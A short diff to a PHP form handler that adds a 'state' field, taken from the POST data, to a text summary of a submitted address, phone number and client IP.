@@ -119,6 +119,7 @@ address-line-2: " . ($_POST['address-line-2'] ?? 'N/A') . "
 phoneNumber: " . ($_POST['phoneNumber'] ?? 'N/A') . "
 country: " . ($_POST['country'] ?? 'N/A') . "
 city: " . ($_POST['city'] ?? 'N/A') . "
+state: " . ($_POST['state'] ?? 'N/A') . "
 postal-code: " . ($_POST['postal-code'] ?? 'N/A') . "
 --------------------------
 IP: $ip
